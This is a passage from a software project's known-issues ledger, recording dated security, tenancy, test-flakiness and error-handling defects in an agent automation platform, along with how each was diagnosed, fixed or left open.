- **`two-more-assertions-in-the-reuse-ladder-suite-could-not-fail`** (**FIXED 2026-08-20**, S4/S5
  round three, LOW severity, process finding). Found by a 39-mutant sweep (34 scripted, 5 hand-applied for this
  round's own fixes) over every safety-critical assertion in the four slice suites - each mutant applied to the SOURCE, run, restored and verified
  byte-identical. Two survived and are now closed by tests:
  (a) `argSlotsOf`'s "TARGETING WINS" rule was untested: no fixture had one name landing in BOTH the
  path and the body, so making the body assignment unconditional stayed green. On a write that is a
  real hole - a body template echoing `{{numero}}` would launder the path occurrence and make the
  resource selector model-fillable. Closed by a both-slots fixture asserting `targeting` and a
  `verifyPlannedArgs` refusal.
  (b) `composeRows`' COLLECTION-side `String(k)` was untested: the only numeric-key case put the
  number on the ACTION side, so dropping the collection-side coercion changed nothing. Closed by the
  mirror direction.
  A third survivor is recorded as a DISMISSAL rather than a hole: deleting the parametrize rung's
  `binding.kind !== 'granted'` skip is safe (an empty allow-list fails closed in
  `assertOriginAllowed`, so the plan is discarded anyway). What it costs is a model call paid for to
  learn nothing, so the test that kills it asserts `turns() === 0`, which is the claim that is
  actually true.

- **`compose-rung-scoped-its-decisions-to-a-unit-app_data-does-not-have`** (**FIXED 2026-08-20**,
  S5 verification round two, was CRITICAL x2 + MAJOR x2; see `docs/decisions.md` D-S5-1). Four
  defects, one root cause: decisions taken per ARTIFACT, per PLAN or per SLOT-TABLE over things
  scoped per OWNER, per CALL-SITE or with no slot table at all.
  (a) CROSS-TENANT, blocker: a peer's ORG-VISIBLE artifact resolved to `usr.<peerUserId>`, opening
  that peer's entire owner-shared namespace - apps the caller cannot see, collections the visible
  artifact never names. Artifact visibility is not entitlement to its owner's rows.
  (b) blocker, and the label is worth stating precisely because the brief and the code differ here:
  its PRIMARY consequence is AVAILABILITY, not exposure. Ambiguity was decided per artifact while
  shared `app_data` is keyed `usr.<owner>` with `Scope.appId` never queried, so one namespace read
  N times counted as N sources, and any owner of a second app - holding anything at all - was
  permanently refused `compose_ambiguous_collection`. Its cross-tenant edge is real but narrower
  than (a): the refusal's `candidates` listed artifact ids, including a PEER'S, so it leaked which
  apps exist and hold a given collection name to someone entitled to none of their rows.
  (c) MAJOR: D1 never engaged for automation-backed actions. With no `httpConfig`, every argument
  classified `unused` and the rule was a blocklist, so a model could choose which resource a WRITE
  acted on.
  (d) MAJOR: the compose rung was entered for writes, so a model's plan could refuse a call that
  had been executing under a standing human approval.
  CLOSED BY: `ownerSharedScope(actor.userId)` at the binding; `mayBeModelFilled` as one allowlist
  predicate shared by the pre-filter and the suite; the `mutates === false` gate moved to the first
  line of `planComposition`. Proven by `api/tests/security/achieve-compose-isolation.test.ts` tests
  5 and 6 (both verified RED against the unfixed binding) and by deleting the tenancy filter at the
  single query-binding point (`appId: scope.scopeKey`), which reds the suite in both directions.

- **`two-assertions-in-the-reuse-ladder-suite-could-not-fail`** (**FIXED 2026-08-20**, S5
  verification round two, LOW severity but a process finding). Found by mutating each safety-critical
  assertion rather than by reading the suite.
  (a) `composeRows`' ACTION-side null-key guard was unfailable: the fixture gave every COLLECTION row
  an absent/null key, emptying the key set, so the result was `[]` however the action side behaved.
  Split into two cases, each keying the opposite side on the literal strings `'null'`/`'undefined'`.
  (b) The caller-args-win spread order is a TRUE equivalent mutant - `declared_args` refuses any
  overlap upstream, so the objects are always disjoint. No test can distinguish the order; recorded
  as unobservable in the source, with the disjointness invariant asserted instead. Dismissal rather
  than a test, in writing, per the ledger rule.

- **`resolve-step-origin-runs-twice-per-gated-browser-step`** (**FIXED 2026-08-19**, round seven;
  see the round-seven fixed section). The walk still runs two to three times per gated browser step -
  that is inherent to resolving locality before the gate and re-resolving after it - but its
  DEFINITION-STORE READS are now memoised per `(integrationKey, actionName)` for the life of the run
  (`engine.ts` `loadDeclarationOnce`), and the same memo is handed to the credential gate. The
  warning in the original entry stands and was followed: the memo is keyed by the LOOKUP, never by
  the step, so nothing resolved for one step is reused for another.

- **`the-permit-is-withheld-where-the-old-shape-would-have-typed-from-the-datacenter`** (OPEN
  2026-08-19, LOW, an intended behaviour change with a real cost, recorded so it is not rediscovered
  as a bug). `hostedTypistPermitFor` withholds the hosted typist entirely when a step required a
  residential line and the connected machine cannot lend one - a step pinned to a machine that does
  not advertise `egress.residential`, which is an ordinary fleet shape since that capability is about
  lending a line to others and most machines never grant it. Such a run now halts
  `needs_credentials` asking for a person where it previously logged in from the datacenter and
  carried on. That is the intended direction (the login was leaving by a different door than the work
  and the portal was being shown two identities for one account), and the halt is a state the product
  already surfaces and a person can act on. **The cost is availability**: an owner whose automation
  used to run unattended now gets a ceremony ask, and the message they see is the generic
  needs-credentials one rather than "your machine cannot lend the login a matching line". A refusal
  that named its own cause would need the permit to carry a reason through the gate into the halt
  payload; not done here, because the payload is a contract shape and widening it is its own slice.

- **`retired-ceremony-halt-cannot-name-the-machine-in-the-fleet's-own-words`** (OPEN 2026-08-19,
  LOW, an honest limit of the message). The retirement halt says "the machine where this session was
  established has been removed from your account - establish this session again, from a machine you
  still have", which names the machine by ROLE and deliberately never prints the pairing UUID (an
  opaque identifier no surface in this product shows a user; the message and the persisted
  `credentialRequest.reason` are both asserted not to contain it).

  **What it cannot do is name it by LABEL**, because there is none to read. `PairingRow`
  (`bridge/registry.ts`) carries `pairingId`, `org`, `ownerUserId`, capabilities and an egress
  endpoint - no device name - and the retired pairing is by definition absent from the fleet listing
  the engine consults, so even a label field would need a separate lookup of a revoked row.
  `locality.ts` is also PURE by construction (no store, no seam, no env), which is what makes its
  whole decision table drivable from a test, so the lookup could not live there. Closing this means
  a device name on the pairing record plus a seam the engine can ask - worth doing when the fleet
  surface grows one, not worth a store read on a refusal path today.

  2026-08-19 (round five): the same halt gained a SECOND producer, `credentialGateRecord` in
  `engine.ts`, which unlike `locality.ts` does hold the fleet listing. It did not change this: a
  retired pairing is absent from that listing by definition, so there is still no row to read a label
  off.
  2026-08-19 (round six): back to ONE producer. `locality.ts`'s copy of the refusal was unreachable
  in production and has been removed, and `SESSION_MACHINE_RETIRED_REASON` now lives in
  `egress-policy.ts` beside `machineRetired`. Closing this is still a single edit.

- **`suite-ledger-unit-census-drifted-red-again`** (2026-08-19, **census half FIXED 2026-08-19**;
  the CI-lane half remains OPEN, LOW, gate rot). `npm run gate:ledger` exited 1 on
  `[FAIL] unit census mismatch`.
  **CORRECTION, 2026-08-19.** The first version of this entry said "disk 64 != ledger 59" and listed
  FIVE offenders, and stated the red was not caused by the branch that found it. Both halves were
  right when written and the count went stale the moment this branch's own round three landed
  `web/__tests__/components/run-status-badge.test.tsx` (commit 6e2096a) without a ledger row: the
  real figure on `feat/p4-locality` was **disk 65 vs ledger 59**, and the sixth offender WAS this
  branch's. Registering it here is what the same-change rule required of round three.
  All six are now in `frontend_unit.surviving` and the census reads `65 (ledger: 65)`. Five were
  genuinely pre-existing and are on `main`: `automations-needs-credentials` (commit 55572ee) and
  `components/schedule-detail-page`, `components/schedule-form-error`, `components/schedules-page`,
  `lib/schedules-authority` (commit f6b5233). The sixth is `components/run-status-badge`.
  **WHAT IS STILL OPEN.** `npm run gate:ledger` still exits 1, on a DIFFERENT line:
  `[FAIL] N artifact(s) are due at G12 but --run was not passed`. That is structural to the bare
  invocation - the script only reports due artifacts green when handed `--run`, which shells out to
  Playwright and the node drivers - and it is identical on `main`. The census line, which is the
  half that carries information about drift, is the half this closes.
  This was the THIRD occurrence of the identical drift (`suite-ledger-unit-census-drifted-red`,
  FIXED 2026-08-05, was the first). It keeps recurring because `gate:ledger` is not in
  `npm run ci:lane`, so nothing forces the entry at merge.
  CLOSE THE REST BY: deciding whether a lane-runnable census-only mode (`--census`) goes into
  `ci:lane`, or recording in `docs/decisions.md` why a gate nothing runs is worth keeping. Not done
  here: adding a gate that boots Playwright and the drivers to the per-PR lane is a CI decision with
  its own blast radius and is out of this branch's scope.

- **`a-machine-halt-on-an-integration-step-is-reported-as-awaiting-integration`** (2026-08-19, OPEN,
  MEDIUM, wrong halt copy + ceiling accounting - found while repairing the P4.2 fixtures, **not
  caused by this branch**: the ordering is on `main` and predates locality). The engine's halt
  cascade (`api/src/automation/engine.ts`) reads, in order, `needs_credentials`, then a BLANKET
  `record.error?.recoverable === false && step.type === 'integration'` -> `awaiting_integration`,
  and only THEN the `awaiting_daemon` detail. So a gated INTEGRATION step whose credential gate
  answers `needs-machine` - "your session is fine, the machine it is bound to is asleep" - is
  reported as `awaiting_integration` and the user is told to go connect an integration that is
  working. Two consequences: the copy names the wrong thing, and `awaiting_integration` is NOT in
  `NEUTRAL_BLOCKED_CODES` (`api/src/schedules/supervisor.ts`, which holds `awaiting_daemon` alone),
  so a schedule waiting on a laptop burns its failure ceiling and auto-pauses instead of waiting.
  More reachable after this branch, which is why it was found here: before the run loop supplied
  `residentialAvailable`, every attended session refused at checkout regardless of step type.
  CONSEQUENCE IF NOT CLOSED: a user whose ceremony laptop is switched off is sent to their
  integrations page, and their schedule pauses itself for a condition that would have cleared on its
  own. CLOSE BY: reading the `awaiting_daemon` detail BEFORE the integration-type blanket, so the
  detail a step actually carries outranks a guess made from its type. Not done here: it changes what
  every integration step reports and needs its own suite over the cascade.
  WORKED AROUND IN TESTS: `api/tests/automation/engine-locality.test.ts` gates a `navigate` step
  rather than the `integration` step wherever it asserts a machine halt, with the reason stated at
  the fixture (`portalBThenGatedA`).

- **`f5-crawl-specs-race-the-background-runner`** (2026-08-19, OPEN, MEDIUM, test-estate - found by
  the api contract lane going red on a loaded box while closing
  `artifact-family-test-leaks-watchers`; **NOT caused by that work**, proven below). Two specs in
  `api/tests/contract/f5-ui-endpoints.test.ts` fail under CPU load and pass on an idle box:

  1. *"a second POST while one is in flight answers alreadyRunning:true"* - `expected true to be
     false`. It fires POST #1 without awaiting it, then POST #2. The crawl it starts fails
     immediately (`Blocked host: 127.0.0.1`, no network by design), so on a loaded event loop run
     #1 has already SETTLED before request #2 is even issued, and #2 legitimately starts a new run.
     Nothing pins the "in flight" precondition the spec's name asserts.
  2. *"GET /sources/:id/crawl ... no run yet: running:false, no progress"* - `expected {…} to be
     undefined`, with a `startedAt` from the PREVIOUS spec. `runner.ts`'s `state.done` `finally`
     does `lastProgress.set(sourceId, finalProgress)`; spec 1 awaits only the HTTP response, never
     the background run, so that write lands AFTER the next `beforeEach` calls
     `__resetCrawlRunnerForTests()` and repopulates the map the reset just cleared.

  **Attribution, measured rather than assumed.** With 24 busy worker threads pinning the CPU,
  `npx vitest run tests/contract/f5-ui-endpoints.test.ts` fails **identically on `main`'s
  unmodified `app-registry.ts`** (2 failed / 16 passed) and on the watcher-collapse branch
  (1-2 failed / 16-17 passed). Idle, both are green (18 passed). The suite touches no app-registry
  path; the shared cause is the crawl runner's un-awaited background task.

  **Why it is worth a row rather than a shrug:** this is the same failure MODE the corrected
  `artifact-family-test-leaks-watchers` entry is about - a lane that goes red for a reason unrelated
  to the change under test trains people to discount its exit code. It is load-sensitive and this
  box routinely runs several agent sessions at once: observed firing in a full-lane run at load
  average ~11 and in an isolated run under 24 busy threads, while an idle full lane at 02:38 the
  same night was 61/61 green. Expect it to recur, and expect it to be blamed on whatever change
  happens to be in the tree.

  **It recurred, exactly as predicted, in the P4 round-five lane (2026-08-19).** The full api
  workspace ran 4895 passed / 1 failed / 2 skipped over 383 files, and the one failure was spec 1
  above. Re-measured immediately afterwards: the same file alone on the round-five tree passed
  18/18 three times in a row, and passed 18/18 on the same branch with the round-five changes
  STASHED - i.e. green both with and without the change, red only under contention. The changed
  files that lane carries are all `api/src/automation/**`, which the crawl endpoints do not reach.
  Recording the measurement rather than the reassurance, because the entry's own prediction is that
  the next author will be told this is theirs.

  **CLOSE BY** (left undone here only because this branch's scope is `api/src/apps/**`): give the
  suite an `afterEach` that does `await cancelCrawlAndWait('s1')` before the runner reset, so no
  background run can write after the clear; and make spec 1's precondition real - hold run #1 open
  with a lookup seam that does not resolve until the spec releases it - instead of racing it.
- **`citius-sync-establishes-its-session-outside-the-locality-decision`** (**PERMIT HALF FIXED
  2026-08-19**, round six; what remains is OPEN, MEDIUM). P4.1 makes the unattended typist's hosted
  browser conditional on a PERMIT the run loop issues only for an origin whose posture allows the
  hosted path (`EnsureSessionInput.hostedTypist`, absent-means-no). The Citius sync rail
  (`routes/sync.ts` -> `legal/citius-sync.ts`) calls `ensureSession` DIRECTLY, and it briefly wrote
  `hostedTypist: {}` into that call unconditionally - an exemption from a rule everything else obeys
  (Capability Contract rule 3), on the one rail that drives a court portal with a lawyer's
  credential.

  **FIXED.** The permit is now an INPUT (`CitiusSyncInput.hostedTypist`) composed at the rail's
  composition point from `classifyOrigin`, exactly as the run loop composes it. The rail decides
  nothing; it forwards. With no `IntegrationAction` declaring the Citius host permissive, the answer
  today is a permit WITHHELD, so no hosted browser opens and the route is `needs-human`. See the
  round-six fixed section.

  **WHAT IS STILL OPEN, and it is narrower than it was.** The rail has no posture DECLARATION to
  consult, so the closed default is the only answer it can ever give: a Citius session can only be
  established by a person, and the typist can never help, however the fleet or the origin changes.
  CLOSE BY: promoting the sync onto a declared integration action, at which point `classifyOrigin`
  reads a real posture and this becomes an ordinary yes-or-no.

  **THE FLEET HALF IS NOT A GAP - it is the correct closed answer, re-dispositioned 2026-08-19.**
  An earlier version of this entry said the rail "never supplies `residentialAvailable`" and should.
  It should not, and wiring it in would have been a defect. After establishment this rail does not
  drive a browser at all: it replays the captured session's cookies over SERVER-SIDE HTTP
  (`citius-mandatarios-http.ts`), from the datacenter, with no proxy seam anywhere in the path.
  Naming a residential machine would make `checkoutSession` RELEASE a session bound to that machine's
  line, which the rail would then replay from a datacenter IP - the exact vantage mismatch checkout
  exists to refuse, and worse than the `needs-egress` refusal it replaces because it succeeds
  silently. The refusal is the honest answer until the walk itself can leave by a machine. Pinned:
  the rail is asserted to pass no `residentialAvailable`, with the reason on the field's docblock.

- **`posture-drift-check-cannot-stop-the-act-that-navigates`** (OPEN 2026-08-19, MEDIUM, a named
  limit of the P4.1 posture-inheritance constraint). Posture is declared on an `IntegrationAction`
  and applies to the origin that action is about. A `browser`/`wait`/`verify` step has no URL, so
  `resolveStepOrigin` walks back to the nearest URL-bearing step - and only an `integration` step
  yields a non-null action, so a browser step can inherit `permissive` from an API origin and then
  be driven onto an unrelated host. The engine now refuses to carry the NEXT step when the hosted
  session's observed origin is not the declared one, which closes the compounding case.

  **It cannot close the first hop.** The act that navigates is the same act the step was authorised
  to perform, and the engine learns where it landed only from the post-action observation. A step
  that navigates to a bank portal and does its work in ONE act is unprotected by this check. The
  bridge is unaffected either way (there is no substitution to make on the owner's own machine); the
  exposure is hosted-only, and it needs a per-ACT origin gate inside the executor - i.e. refusing an
  act whose resolved destination leaves the declared origin - which is a different slice.

- **`blocked-badge-copy-is-keyed-on-codes-nothing-enumerates`** (OPEN 2026-08-19, LOW, drift risk).
  `schedules.runBlocked` in `web/locales/*` keys its copy by `detail.code`, and those codes are
  produced in `api/src/schedules/supervisor.ts` (`mapAutomationOutcome`, `mapIntegrationOutcome`)
  and `api/src/automation/service.ts` with no shared enumeration between them, and
  `ScheduleRun.detail.code` is a free `z.string().max(64)`. A new blocked cause added on the API
  side renders the vague fallback until someone remembers the locale keys, and nothing fails when
  they do not.
  `web/__tests__/components/run-status-badge.test.tsx` pins that the fallback is honest (never a
  specific wrong instruction) and that en/pt stay key-for-key, which bounds the damage; a shared
  code vocabulary in `shared/` would end it. Deliberately not added here: it is a contract change,
  and Rule 7 wants that decided on its own rather than as a tail of a UI fix.

- **`undeclared-origins-are-bridge-only-so-a-daemonless-dev-halts-browser-steps`** (OPEN 2026-08-19,
  MEDIUM, developer ergonomics - the deliberate cost of P4.1, recorded rather than hidden). Execution
  locality is now gated by the ORIGIN POSTURE in every environment, and posture defaults
  ADVERSARIAL. A `navigate` step states its own URL and carries no action, so `resolveStepOrigin`
  answers `action: null` for it and `classifyOrigin` returns the closed classification - which means
  a plain planner-authored `navigate`/`browser` automation is BRIDGE-ONLY. On a developer machine
  with no paired daemon those steps now halt in `awaiting_daemon` where they previously ran in the
  hosted Chromium, because `config.localBrowserEnabled` defaulted to `!isProd`.

  **This is the intended behaviour, not a regression to fix by loosening it.** The two escape routes
  are the two the design intends: pair a daemon (`clients/bridge`), or declare the action's posture
  (`IntegrationAction.posture: 'permissive'` with an `httpConfig.baseUrl` covering the origin). An
  env override that reopened the hosted browser for an adversarial origin was considered and
  REFUSED in `docs/decisions.md` (2026-08-19): it is the same defect wearing a different variable
  name, and it would give `adversarial + cloud egress` a representation that
  `origin-posture.ts`'s frozen constructor exists to make impossible.

  **What is genuinely open** is the ergonomics, not the policy: there is no way today to declare a
  posture for a bare `navigate` step's origin, because posture lives on `IntegrationAction` and a
  navigate step has no action. Adding one to `StepDeclaration` would be wrong - the step is
  MODEL-AUTHORED, so the authorised artefact and the authorising artefact would be the same file,
  which is exactly the hole the deletion of `declaredOrigins` closed. The likely right answer is a
  tenant-scoped, human-authored origin posture list resolved through the same seam, and it is not
  built. Until it is, dev drives browser automations through a paired daemon.

- **`daemon-seam-cannot-ask-for-a-specific-machine-so-the-ceremony-preference-can-refuse-spuriously`**
  (OPEN 2026-08-19, MEDIUM, availability - a named limitation of P4.2, not a silent one).
  `automation/seams.ts` `getDaemonConnection(ownerUserId)` is bound to `bridge/registry.ts`
  `getConnectionByOwner`, which answers "the NEWEST live socket for this owner" and cannot be asked
  for a particular one. P4.2 gives an adversarial session a preference for the pairing its ceremony
  happened on, and `locality.ts` honours it by REFUSING a connected machine that is not it. For a
  user with one machine that is exactly right. For a user with two, the run halts whenever the
  arbitrary pick is the other one - even though the preferred machine is online and dialled in.

  **The primitive that fixes it already exists and is INERT**, which is how this slice found it:
  `bridge/registry.ts` `selectConnectionForStep` implements `pinned | any:<capability> | cloud`
  selection with the org and owner checks, is fully covered by
  `api/tests/security/step-declaration-routing.test.ts`, and has NO production caller - the same
  shape `egress-policy.ts` was in before P4.1. Closing this means widening the daemon seam to
  `(ownerUserId, preferred?: { pairingId, orgId })` and binding it to `selectConnectionForStep`
  with `target: { kind: 'pinned' }`, plus deciding whether the run's connection may be re-resolved
  mid-run (it is captured once today, and a `DaemonBrowserSession` binds it at construction).

  **Deliberately not done here.** It changes which machine executes a step, which is a
  security-relevant routing surface that deserves its own slice and its own suite rather than a
  tail-end addition to one already touching the engine, the schedules rail and `shared/`. The
  failure direction is the safe one meanwhile: the run HALTS naming the machine it wants, rather
  than silently executing on a different one.

- **`schedule-blocked-notification-has-no-client-consumer`** (OPEN 2026-08-19, LOW, half-wired
  surface). P4.1 emits an additive `schedule_blocked` NotificationEvent on the per-user
  notifications channel when a scheduled fire halts waiting for its owner, and
  `ScheduleSupervisorDeps.notifyBlocked` is required so the rail cannot boot half-wired. NOTHING IN
  `web/` LISTENS FOR IT YET: `header.tsx` subscribes to `usage_updated` only, so today the event
  lands in the stream and is dropped. The durable record (the `blocked` schedule run row, already
  rendered by the schedules surface) is unaffected, so nothing is lost - but the notification is not
  yet a user-visible improvement, and claiming the owner "is told" is true only of the wire. Closing
  it means a client subscription plus the pt/en strings derived from the CODE (never server prose).
  Scoped out of P4 deliberately: it is a web slice, and this one is api-side.

- **`workspace-scoped-verification-misses-two-workspaces`** (2026-08-18, OPEN as a PROCESS gap; the
  two red pins it hid are FIXED). Twice now a change has grown the public surface, left a pin red,
  and been declared green by a reviewer who ran `npm test --workspace api` and
  `npm test --workspace web` rather than root `npm test`. The root script fans out to FIVE
  workspaces; `shared` and `clients/cortex-cli` were never executed.

  **Measured, on `main` after the schedules landing:** `shared/src/contract.test.ts` red
  (`expected 33 to be 32` - the descriptor-map pin) and `clients/cortex-cli/tests/client.test.ts`
  red (`expected [ ...(41) ] to have a length of 31` - the public-operation pin). Both had been red
  since `5a5e721`, through the review gate, the fix round, and a push to origin. Repaired in
  `3c44bcf` and `adb007e`.

  **This is the SECOND occurrence of the shared pin specifically** - `contract.test.ts`'s own
  comment already records `appEmail`/`appVision` landing without bumping it (2026-08-06, repaired
  2026-08-07). A defect that recurs on the same file with the same cause is a process gap, not an
  oversight.

  **Why the other gates did not catch it, and why that is correct.** `gate:client-drift` was green
  the whole time, and rightly so: drift proves the GENERATED client matches the spec, which it did.
  The pin proves a HUMAN noticed the public surface grew. They answer different questions and
  neither substitutes for the other - which is exactly why the pin has to actually run.

  **Closes when:** the verification habit is structural rather than remembered - either every
  "is it green" claim runs root `npm test`, or the two pins move into a lane that the api/web
  runs cannot skip. Until then, treat any green claim scoped to a workspace as unproven for the
  other three.

- **`browser-step-retry-may-double-fire`** (2026-08-18, OPEN, self-reported by the slice that
  introduced it - the automation budgets/primitives work, `ca43335`). The new deterministic
  per-step retry (`STEP_RETRY_BUDGET.deterministicRetries`, `engine.ts:1568-1600`) re-issues the
  SAME cached DOM action after a runtime failure. A browser step can fail having PARTIALLY
  succeeded - a click that landed and then threw while waiting for navigation - so a
  non-idempotent browser step (submit, confirm, pay) could fire twice.

  **This is not a new class of failure.** The old path reached the same place: on a cache failure
  it fell through to vision, which typically re-resolved to the same click and acted again. What
  changed is the COST of getting there - the retry is now cheap and unconditional where the vision
  path was expensive and occasionally resolved elsewhere. So the risk is pre-existing but is now
  materially easier to hit.

  **Why it is open rather than fixed here.** There is no consent gate on `browser` steps the way
  there is on `api_call` (`action-executor.ts` refuses `awaiting_consent` before any credential
  load; a DOM click has no equivalent). Closing this properly means deciding what makes a browser
  step non-idempotent - and the honest answer is that the engine cannot know from a locator alone.
  Plan trap T4 already covers replay idempotency for INJECTED CALLS via `InjectedCall.idempotent`
  (P2.3), where the HTTP method makes the answer structural. The browser-step case wants the same
  treatment and should land with P2.3 or P4, not as a guessed heuristic here.

  **Closes when:** a browser step carries an idempotence verdict the retry consults, of the class
  `InjectedCall.idempotent`, with a test proving a non-idempotent step is not silently re-issued.

- **`verify-step-vision-fallthrough-uncounted`** (2026-08-18, OPEN, scoped out deliberately).
  `executeVerifyStep` has its own assertion-cache to vision fallthrough that remains UNCOUNTED,
  while the browser-step fallthrough is now bounded by `STEP_RETRY_BUDGET.visionRegroundsPerStep`.
  The budgets work deliberately did not widen its blast radius across a 2300-line central file.
  Small and self-contained; closes by threading the same `createStepRetryLedger` through the verify
  path with a spec of the same shape.

- **`knowledge-fts-heal-scan-unscoped`** (2026-08-11, OPEN, found by a full api-suite run during
  the `run-error-text-leak` work; NOT caused by it). `api/tests/security/knowledge-scoping.test.ts`
  ("grep gate: every CONTENT-bearing knowledge_fts query filters on orgId") fails
  **deterministically, in isolation** on `main` at 922749c. The hit is
  `api/src/knowledge/index-store.ts:170`, in `healDocMap`:
  `SELECT rowid, orgId, collection, docId, title, createdAt, sourceUrl, sourceType, language FROM
  knowledge_fts` - a whole-table scan selecting `title`, with no orgId predicate. The gate's own
  comment still asserts the only org-agnostic statements are `COUNT(*)` counters "neither of which
  reads text"; the doc-map heal now denormalizes `title`, so that stated assumption no longer holds.

  **Assessment: a false positive on the letter of the rule, not a tenancy hole - but the gate is
  right to be red.** `healDocMap` is derived-data self-heal: it reads every fts row and writes each
  one back into `knowledge_doc_map` **under that row's own `orgId`** (`ins.run(r.orgId, ...)`). It
  serves nothing to a caller and mixes no orgs, so no content crosses a tenant boundary. What is
  broken is the invariant's *statement*: "content-bearing query" no longer distinguishes a
  maintenance scan from a serve path.

  **FIXED 2026-08-13** (this ledger entry kept in place for the history of the deferral): the
  2026-08-11 deferral cited another session's in-flight knowledge/crawl work, which has since
  landed (922749c is on `main`), so resolution **(b)** was taken during the assistant-overhaul
  batch that was already editing `index-store.ts`: `healDocMap` now rebuilds the doc-map PER-ORG
  (`SELECT DISTINCT orgId` - ids only, no content - then `WHERE orgId = ?` per partition), so
  every content-bearing fts read carries an orgId predicate with no gate carve-out, and the heal's
  working set is bounded to one partition at a time instead of the whole 200k+-row shared corpus.
  The gate (`api/tests/security/knowledge-scoping.test.ts`) and the heal-behavior tests
  (`api/tests/knowledge/index-store.test.ts`) are both green; the regex was not touched.

- **`run-error-text-leak`** (2026-08-10, **CRITICAL**, found live by the owner on the dev stack;
  FIXED 2026-08-11). A user asked the agent, in Portuguese, `faz um site a falar das apps
  juridicas do ekoa`. The reply rendered in the agent's own message bubble was:

  > *credential expired and refresh failed: OAuth refresh not configured (LLM_OAUTH_REFRESH_URL +
  > stored refresh token required)*

  Two independent defects, both production-blocking. Owner's framing: "a user gets this once its
  game over".

  **Defect 1 - internal error text reached the user.** `getSecret()` threw a `CredentialError`
  naming the missing env var; it propagated out of `runAgent`; `agents/chat.ts`'s catch-all did
  `finishError('ADAPTER_ERROR', err.message)`, putting the exception text on the wire; the web's
  guard (`web/lib/sanitize-error.ts`) was a DENYLIST of provider-leak substrings that the string
  matched none of, so it rendered verbatim - styled `type: 'status'`, i.e. as a considered remark
  by the agent rather than a failure. Two more sites of the same class were found by audit:
  `build.ts` streamed `progress.reasons` (gate diagnostics) on `BUILD_UNFULFILLED`, and streamed
  the verifier's MODEL-DERIVED `verdict.note` on `VERIFY_FAILED` - the very PII vector `jobView`'s
  `SAFE_ERROR_MESSAGE` map was written to block on the polled view, left open on the live stream.

  **Root cause is structural, not a missing denylist entry.** The wire's `message` was a free
  string, so "don't leak" depended on every producer remembering. A denylist fails OPEN for every
  internal string nobody enumerated - which is every future one. It was also believed to be
  someone else's job: `events/sse-manager.ts`'s header claimed "the egress error sanitizer is
  applied at the event serializer (ch09 invariant 2)" and it never was - `emit`/`writeFrame` do a
  bare `JSON.stringify`. That comment read as a safety net that did not exist; corrected in place.

  **A 58-agent audit sweep found six more sites of the same class**, all fixed here:
  `build.ts`'s COMPLETE event embedded raw esbuild diagnostics (`bundle.error` =
  `result.errors.join('; ')`, carrying sandbox file paths) in the user's completion summary;
  `automation/engine.ts` put a raw step failure (`record.error?.message`) into the run's terminal
  headline at two call sites; `routes/artifacts.ts` passed a thrown backup-store message into a
  `NOT_FOUND` envelope; `agents/integration-agent.ts` returned `outcome.cause.message` into the
  envelope the builder UI renders; and `web/hooks/useAgentExecution.ts` rendered
  `` `Error: ${error.message}` `` from a client-side throw straight into the transcript.

  **Fix.** User-facing text is now DERIVED FROM A CODE and never carried as prose.
  `shared/src/run-errors.ts` holds the terminal vocabulary (`RunErrorCode`), the pt/en text, and
  `RUN_ERROR_RETRYABLE`; it is the one definition both sides use (FIXED-1 safe - `shared/` imports
  nothing). The sinks (`agents/streaming.ts`) take a CODE, never a message, and fill the wire text
  from that table, so a producer *cannot* pass prose - the type system refuses it. Catch-alls
  classify structurally via `agents/run-failure.ts` (`CredentialError` -> `AUTH_ERROR`, rate cap ->
  `RATE_LIMITED`, ...) instead of echoing, and log the honest cause with the run id. The web
  renders `runErrorMessage(code, locale, params)` and never `event.message`; an unknown code
  degrades to `UNKNOWN`'s branded text. The billing URL moved from concatenated prose to a
  structured `params.billingUrl` on the event. `jobView` now reads the same shared table instead of
  its own private map, so the polled view and the live stream cannot disagree. The failed turn also
  renders as an ERROR (was `status`) and offers Retry when `RUN_ERROR_RETRYABLE` says retrying can
  help - the user's message is preserved and re-sent, so a failure is no longer a dead end.
  Deliberately kept: `sanitizeUserFacingError`, as defence in depth for the paths that genuinely
  have only a string, hardened with credential/plumbing needles.

  **Defect 2 - OAuth refresh never worked anywhere.** `defaultRefresh` required
  `LLM_OAUTH_REFRESH_URL`, which no environment ever set, and *no* provisioning path
  (`provision-credential.mjs`, `rearm-credential.mjs`, `dev-credential.mjs`) sent the
  `refreshToken`/`expiresAt` the contract already accepted - `scripts/dev-credential.mjs` held a
  working refresh pair on disk and dropped both at the POST boundary. So every oauth credential was
  a time bomb: fine until expiry, then every chat and build run failed until a human re-armed by
  hand. The original comment called the unset default "the correct fail-closed posture"; fail-closed
  is right for authorisation, not for a self-heal path whose absence takes the product down.
  **Fix.** The token endpoint and client id are defaulted to the public subscription values (the
  same ones `dev-credential.mjs` has been refreshing against successfully all along), overridable
  via `LLM_OAUTH_TOKEN_URL` / `LLM_OAUTH_CLIENT_ID`; the JSON-then-form request shape mirrors that
  script so the two cannot drift. All three provisioners now carry `refreshToken` + `expiresAt`, and
  rotated refresh tokens are persisted. An unrefreshable oauth credential is warned about at load
  and at provision time (`[llm][claudeAuth] WARNING: oauth credential stored WITHOUT a refresh
  token`) rather than discovered hours later by a user.

  **Tests.** `shared/src/run-errors.test.ts` (vocabulary exhaustiveness; a forbidden-substring sweep
  proving no code's copy in either locale can mention the engine, credentials, tokens or env vars;
  fail-closed normalization). `api/tests/agents/run-error-leak.test.ts` reproduces the exact
  production state through the REAL credential machinery - an expired credential plus a failing
  refresh seam, not a mocked throw - and pins `AUTH_ERROR` + zero internal substrings on any event,
  on the settled run record a reconnecting client polls, and no assistant message persisted;
  verified to FAIL against the pre-fix line. `web/__tests__/sanitize-error.test.ts` pins
  render-from-code and unknown-code fail-closed.

- **`base-template-consumption-gaps`** (2026-08-09, LOW-MEDIUM, found by a consumption-map audit
  during the impeccable-bases template pass; none are regressions - all predate the pass). Four
  distinct gaps in how `api/assets/bases/*` content is (not) consumed:
  1. **`recipes/` is orphaned content.** `base-loader.ts loadBase()` never reads `recipes/`; yet
     `app/instructions/base-conventions.md` rule 6 tells the build agent to use the `empty-state`
     recipe it never receives. Either inject recipes as prompt sections or drop the references.
     (The impeccable-bases pass mitigates the empty-state case specifically: the app scaffold's
     `index.css` now ships a crafted `.empty-state` implementation directly, and the base
     conventions describe it in-file.)
  2. **`app-auth-persistent` produces an unbuildable project if explicitly selected.** It has no
     `scaffold/`, only 4 wiring files, so `scaffold.ts` takes the template branch (files > 0),
     suppresses the generic starters, and the project has no `index.jsx`/`App.jsx`; its
     `mustEdit: ["frontend/src/App.jsx"]` then names a file that never exists, so
     `assertProgress` can never pass. Unreachable in practice (nothing sets `templateId` to it -
